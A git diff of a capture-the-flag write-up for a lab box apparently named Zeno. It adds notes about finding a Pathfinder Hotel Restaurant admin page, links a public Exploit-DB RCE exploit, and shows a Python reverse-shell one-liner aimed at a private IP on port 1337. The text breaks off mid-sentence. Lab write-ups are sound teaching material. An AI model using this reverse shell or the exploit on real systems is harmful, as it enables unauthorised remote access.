@@ -30,7 +30,7 @@ Nmap done: 1 IP address (1 host up) scanned in 211.64 seconds
 
 By accessing the port `12340`, I got thus following page.
 
-img1
+<figure><img src="zeno-1.png" alt=""><figcaption></figcaption></figure>
 
 ## Enumeration
 
@@ -62,9 +62,23 @@ ________________________________________________
 rms                     [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 127ms]
 ```
 
-I got this page
+Accessing this page, we can see a form. I create a register but there was nothing interesting.
 
-img2
+<figure><img src="zeno-2.png" alt=""><figcaption></figcaption></figure>
+
+I found previously an admin page, accessing it I noticed a "Pathfinder Hotel Restaurant", searching it on google, I found a public exploit that allows us to get a RCE. 
+
+<figure><img src="zeno-3.png" alt=""><figcaption></figcaption></figure>
+
+Using this following exploit, I got a RCE.
+
+https://www.exploit-db.com/exploits/47520
+
+<figure><img src="zeno-4.png" alt=""><figcaption></figcaption></figure>
+
+Accessing the page, I was able to 
+
+<figure><img src="zeno-5.png" alt=""><figcaption></figcaption></figure>
 
 ```
 export RHOST="192.168.130.101";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
